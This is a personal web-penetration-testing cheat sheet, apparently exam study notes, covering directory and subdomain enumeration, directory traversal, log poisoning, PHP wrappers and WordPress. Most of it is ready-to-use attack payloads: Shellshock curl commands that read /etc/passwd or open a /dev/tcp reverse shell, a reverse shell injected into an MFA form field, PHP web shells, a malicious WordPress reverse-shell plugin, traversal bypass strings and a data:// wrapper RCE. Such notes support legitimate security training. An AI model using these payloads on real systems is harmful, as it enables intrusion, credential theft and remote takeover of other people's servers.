### Directory Scanning
#### Gobuster
- `gobuster dir -u $URL -w /usr/share/wordlists/$wordlist.txt -t 5 -x .php, .txt -o gobuster.txt`
	- Where `-o` the resulting output is called results.txt
	- Where `-x` checks for those extensions
- EX: `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5`
- EX: `gobuster dir -u http://$IP/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k`
- Dirb is recursive - EX: `dirb http://$IP -z 10`
- **To ignore ssl/tls errors, use the `-k` flag**

#### feroxbuster 
-`feroxbuster -u $URL`
- `feroxbuster -u $URL -w $wordlist`
- `feroxbuster -u $URL -t $numberOfThreads`
- `feroxbuster -u $URL --timeout $timeoutInSeconds`
- `feroxbuster -u $URL --filter-status 404,403,400 --thorough -r`
- `feroxbuster -u $URL:$alternatePort
- `feroxbuster -u $URL -w $wordlist`

#### Nikto
- `nikto -h http://foo.com -port 8000`

#### Subdomains
**need to edit /etc/hosts with the subdomain**
With gobuster `gobuster dns -d $domain.local -t 25 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

With wfuzz: `wfuzz -c -f sub-domains -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'domain.com' -H "Host: FUZZ.domain.com" --hw 93` where:
- The `-c` flag prints output with colors
- The `-f` flag outputs to a file (`sub-domains`)
- The `-w` flag is to name the wordlist
- The `-u` flag is to name the url
- THe `-H` flag is to pass the header
- The `--hw` flag is to hide results with a word count of 93. You'll need to run without this flag and then see what you are getting too much of. 

With ffuf: `ffuf -u http://$IP -H 'Host: FUZZ.domain.com' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac`

dirsearch: `dirsearch -u http://dev.devvortex.htb/”`


### General Notes
- Check for robots.txt and sitemap.xml!
- Check for admin consoles for respective apps (MySQL, Tomcat, phpmyadmin, etc)
- Check source
	- Usernames, passwords, IPs of other machines?
	- Any fields to input data for SQLi or XSS 
	- If you find cgi-bin and are forbidden to access it, you can still brute force the cgi names to test for shellshock vuln
		- `gobuster dir -u http://$IP/ -e -s "200,204,403,500" -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt`
		- `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://[IP]/cgi-bin/user.sh`
		- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/53 0>&1' http://$IP/cgi-bin/user.sh`
- Take note of framework and OS the webserver is using.  Might help you know what tools are installed on the system.
- Useful nmap scripts:
	- `http-shellshock --script-args uri=[PATHTOCGI]`
- php://filter and php://data wrappers are gonna be big!

### Directory Traversal
On Linux, we can use the `/etc/passwd` file to test directory traversal vulnerabilities. On Windows, we can use the file `C:\Windows\System32\drivers\etc\hosts` to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
- May need to access these files, `/etc/passwd` through Burp
- Try absolute path, like `/etc/passwd` as well as with traversal sequences like `../../`
- Consider that the `../` maybe be stripped: 
  `/image?filename=....//....//....//etc/passwd` (for if application strips path traversal sequences from the user-supplied filename before using it)
- Encoding:
	  - Without:`../../../etc/passwd`
	  - URL Encoded: `%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd`
	  - Double URL encoded: `%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd`
- If the start of the path is validated for user supplied input: 
	- `image?filename=/var/www/images/../../../../etc/passwd`
- If the application requires the filename to end with an expected file extension:
	- `/image?filename=../../../etc/passwd%00.jpg`
	- **The `%00` is a null byte which effectively terminates the file path before the extension. **

### Encoding Notes (not sure)
Examples:	`%20 = " "` and `%5C = "\"` and `%2e = "."` and `%2f = "/"`
- Note: Don't encode the "-" character in flags, and it looks like "/" characters also don't need to be encoded. 
- [URL Encoder](https://www.urlencoder.org/)
- EX: `curl http://$URL$.com/directory/uploads/backdoor.pHP?cmd=type%20..%5C..%5C..%5C..%5Cxampp%5Cpasswords.txt
	- where backdoor is the cmd script in the RFI section below that has already been uploaded to the Windows machine so that we can read the passwords.txt file.
	- When there is a username field, password field, and additional called MFA - From: "&&bash -c "bash -i >& /dev/tcp/192.168.45.179/7171 0>&1""
	- Becomes: `username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"`
	- So make sure to enclose command in `"&&$encondedCommand"` (incl. quotes).

#### LOG POISONING
`<?php echo system($_GET['cmd']); ?>`
Then submit `&cmd=$command` in request i.e. `&cmd=whoami`

#### Shells
- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
- `bash -c "bash -i >& /dev/tcp/$IP/4444 0>&1"`
	- can URL encode
- [revshells.com](revshells.com)


### Specific Web Servers
#### Apache
This might need to be in the /etc/apache2/apache2.conf file for php to execute:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

#### IIS 
payload = .asp/.aspx shell

`C:\inetpub\wwwroot`
`iisstart.htm` = default welcome page


.htaccess for IIS servers: Similarly, developers can make directory-specific configuration on IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:
```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```


### Wordpress
Initial enumeration: `wpscan --url http://$url --api-token $APIToken`
`/wp-admin` is the admin login page.
#### reverse shell Wordpress plugin
If you get into the admin page, you can upload malicious plugins. Plugins are defined as a zip file with 2 php files inside. (This may not be true provided the below syntax info is included in the php exploit file - so one file total with this or two files - one with this and one with the exploit). Syntax below:
```
	    <?php
	    
	    /**
	    * Plugin Name: Reverse Shell Plugin
	    * Plugin URI:
	    * Description: Reverse Shell Plugin
	    * Version: 1.0
	    * Author: Author Name
	    * Author URI: http://www.website.com
	    */
	    
	    exec("/bin/bash -c 'bash -i >& /dev/tcp/$kaliIP $port 0>&1'");
	    ?>
```

- The plugin files will be accessible from the following link:
`http://$target/wp-content/plugins/$zipName/$phpFileNmae`

### Upload Execution Tip
1. `echo "AddType application/x-httpd-php .xxx" > .htaccess`
2. upload the .htaccess file
3. then upload the .xxx file which can be executed as php

### PHP Wrappers
Note that in order to exploit these vulnerabilities, the allow_url_include setting needs to be enabled for PHP, which is not the case for default installations. That said, it is included in the material, so it makes sense to be aware of it. 
Ex: exploiting a page called admin.php
-  `curl http://$IP/$directory/index.php?page=admin.php`
-  Note that if the `<body>` tag is not closed (with a `</body>` tag at the end), the page could be vulnerable. Let's try to exploit it with the **php://filter** tag. 
	1. `curl http://$IP/$directory/index.php?page=php://filter/**convert.base64-encode**/resource=admin.php`
		1. This should return the whole page which can then be decoded for further information. 
	2. `echo "$base64Text" | base64 -d`
- Now let's try with the **data://** warpper. 
	1. `curl "http://$IP/$directory/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"`
		1. This shows that we can execute embeeded data via LFI. 
	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
	3. `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
	4. `"http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`